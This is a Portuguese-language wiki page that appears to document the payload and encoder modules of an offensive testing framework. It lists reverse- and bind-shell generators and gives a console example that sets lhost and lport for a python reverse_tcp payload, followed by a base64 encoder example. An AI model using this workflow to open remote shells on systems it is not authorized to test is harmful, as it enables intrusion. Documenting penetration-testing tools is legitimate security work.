# Payloads e encoders

**Idioma:** pt-BR. **English (en-US):** [../en-US/09-payloads-and-encoders.md](../en-US/09-payloads-and-encoders.md)

## Payloads — `payloads/*`

Geram **trechos de código** ou comandos para *bind* / *reverse shell* em várias arquiteturas e linguagens *one-liner*.

Categorias típicas (veja anexo):

- **Arquiteturas:** `armle`, `mipsbe`, `mipsle`, `x86`, `x64`
- **Linha de comando:** `cmd/` — netcat, bash, perl, php, python, awk, …
- **Linguagens embutidas:** `python/`, `perl/`, `php/`

### Uso típico no framework

Muitos *workflows* carregam um payload como módulo, definem `lhost`/`lport` (quando aplicável) e copiam a saída para outra ferramenta ou módulo de entrega.

```text
use payloads/python/reverse_tcp
show options
set lhost 192.168.56.1
set lport 4444
run
```

**Leia `show info`** — *payloads* podem ser detectados por EDR; use só em ambiente de teste.

## Encoders — `encoders/<lang>/*`

Transformam representações de *payload* (Base64, hex, URL, ROT13, …) nas linguagens:

- `encoders/python/`
- `encoders/php/`
- `encoders/perl/`

```text
use encoders/python/base64
show options
run
```

---

[Wiki hub](../README.md)
